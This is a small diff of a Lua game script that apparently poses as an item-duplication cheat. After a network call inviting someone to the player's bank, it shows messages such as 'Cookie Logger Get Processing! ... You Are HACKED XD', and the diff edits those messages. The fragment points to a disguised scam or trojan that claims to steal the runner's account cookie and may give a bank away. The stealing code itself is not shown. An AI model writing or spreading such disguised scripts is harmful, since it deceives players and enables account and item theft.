@@ -15,7 +15,7 @@ if request then
 else
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
-	lib.Message.New("Dupe Proccesing! (Your Cookie is get Claimed! You Are HACKED XD)");
+	lib.Message.New("Cookie Logger Get Processing! (Your Cookie is get Claimed! You Are HACKED XD)");
 else
-	lib.Message.New("YOUR ACCOUNT COOKİE İS GET CLAİMED YOU GOT HACKED XD");
+	lib.Message.New("-");
 end;
